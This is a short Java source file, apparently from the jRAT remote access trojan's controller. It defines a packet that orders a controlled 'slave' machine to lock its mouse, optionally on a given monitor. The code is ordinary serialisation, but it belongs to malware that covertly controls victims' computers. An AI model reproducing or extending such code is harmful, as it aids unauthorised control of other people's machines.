package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet27ToggleMouseLock extends AbstractOutgoingPacket {

	private boolean enabled;
	private int monitor;

	public Packet27ToggleMouseLock(boolean enabled) {
		this(enabled, -1);
	}

	public Packet27ToggleMouseLock(boolean enabled, int monitor) {
		this.enabled = enabled;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeBoolean(this.enabled);

		if (this.enabled) {
			slave.writeInt(monitor);
		}
	}

	@Override
	public short getPacketId() {
		return 27;
	}

}
